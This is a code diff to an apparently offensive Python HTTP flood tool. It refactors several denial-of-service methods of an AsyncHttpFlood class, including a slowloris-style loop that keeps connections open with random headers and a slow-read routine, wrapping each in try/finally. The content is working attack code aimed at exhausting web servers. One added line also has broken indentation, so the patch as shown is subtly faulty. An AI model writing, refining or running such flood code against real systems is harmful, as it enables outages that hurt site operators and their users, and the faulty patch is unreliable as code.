@@ -1051,32 +1051,38 @@ class AsyncHttpFlood(HttpFlood):
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
-        writer.write(payload)
-        await asyncio.wait_for(writer.drain(), timeout=1)
-        self._stats.track(1, packet_size)
-        packets_sent += 1
-        await asyncio.sleep(5.01)
-        ts = time()
-        for _ in range(self._rpc):
+        try:
             writer.write(payload)
             await asyncio.wait_for(writer.drain(), timeout=1)
             self._stats.track(1, packet_size)
             packets_sent += 1
-            if time() > ts + 120: break
-        writer.close()
-        await asyncio.wait_for(writer.wait_closed(), timeout=1)
+            await asyncio.sleep(5.01)
+            ts = time()
+            for _ in range(self._rpc):
+                writer.write(payload)
+                await asyncio.wait_for(writer.drain(), timeout=1)
+                self._stats.track(1, packet_size)
+                packets_sent += 1
+                if time() > ts + 120: break
+        finally:
+            writer.close()
+            await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
     async def EVEN(self) -> int:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
-        for _ in range(self._rpc):
-            writer.write(payload)
-            await asyncio.wait_for(writer.drain(), timeout=1)
-            packets_sent += 1
-            self._stats.track(1, packet_size)
-            await asyncio.wait_for(reader.read(1), timeout=1)
+        try:
+            for _ in range(self._rpc):
+                writer.write(payload)
+                await asyncio.wait_for(writer.drain(), timeout=1)
+                packets_sent += 1
+                self._stats.track(1, packet_size)
+                await asyncio.wait_for(reader.read(1), timeout=1)
+        finally:
+            writer.close()
+            await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
     async def OVH(self) -> int:
@@ -1087,14 +1093,16 @@ class AsyncHttpFlood(HttpFlood):
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
-        for _ in range(self._rpc):
-            await asyncio.sleep(max(self._rpc / 1000, 1))
-            writer.write(payload)
-            await asyncio.wait_for(writer.drain(), timeout=1)
-            packets_sent += 1
-            self._stats.track(1, packet_size)
-        writer.close()
-        await asyncio.wait_for(writer.wait_closed(), timeout=1)
+        try:
+            for _ in range(self._rpc):
+                await asyncio.sleep(max(self._rpc / 1000, 1))
+                writer.write(payload)
+                await asyncio.wait_for(writer.drain(), timeout=1)
+                packets_sent += 1
+                self._stats.track(1, packet_size)
+        finally:
+            writer.close()
+            await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
     # XXX: make sure writer is closed on exception
@@ -1102,25 +1110,27 @@ class AsyncHttpFlood(HttpFlood):
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
-        for _ in range(self._rpc):
-            writer.write(payload)
-            await asyncio.wait_for(writer.drain(), timeout=1)
-            packets_sent += 1
-            self._stats.track(1, packet_size)
-        while True:
-            writer.write(payload)
-            await asyncio.wait_for(writer.drain(), timeout=1)
-            packets_sent += 1
-            self._stats.track(1, packet_size)
-            await asyncio.wait_for(reader.read(1), timeout=1)
-            for i in range(self._rpc):
-                keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
-                writer.write(keep)
+        try:
+            for _ in range(self._rpc):
+                writer.write(payload)
                 await asyncio.wait_for(writer.drain(), timeout=1)
-                self._stats.track(0, len(keep))
-                await asyncio.sleep(self._rpc / 15)
-        writer.close()
-        await asyncio.wait_for(writer.wait_closed(), timeout=1)
+                packets_sent += 1
+                self._stats.track(1, packet_size)
+            while True:
+                writer.write(payload)
+                await asyncio.wait_for(writer.drain(), timeout=1)
+                packets_sent += 1
+                self._stats.track(1, packet_size)
+                await asyncio.wait_for(reader.read(1), timeout=1)
+                for i in range(self._rpc):
+                     keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
+                    writer.write(keep)
+                    await asyncio.wait_for(writer.drain(), timeout=1)
+                    self._stats.track(0, len(keep))
+                    await asyncio.sleep(self._rpc / 15)
+        finally:
+            writer.close()
+            await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
     # XXX: with default buffering setting this methods is gonna suck :(
@@ -1128,19 +1138,21 @@ class AsyncHttpFlood(HttpFlood):
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
-        for _ in range(self._rpc):
-            writer.write(payload)
-            await asyncio.wait_for(writer.drain(), timeout=1)
-            packets_sent += 1
-            self._stats.track(1, packet_size)
-            while True:
-                await asyncio.sleep(.01)
-                data = await reader.read(1)
-                if not data: break
-            writer.write(b'0')
-            await asyncio.wait_for(writer.drain(), timeout=1)
-        writer.close()
-        await asyncio.wait_for(writer.wait_closed(), timeout=1)
+        try:
+            for _ in range(self._rpc):
+                writer.write(payload)
+                await asyncio.wait_for(writer.drain(), timeout=1)
+                packets_sent += 1
+                self._stats.track(1, packet_size)
+                while True:
+                    await asyncio.sleep(.01)
+                    data = await reader.read(1)
+                    if not data: break
+                writer.write(b'0')
+                await asyncio.wait_for(writer.drain(), timeout=1)
+        finally:
+            writer.close()
+            await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
 
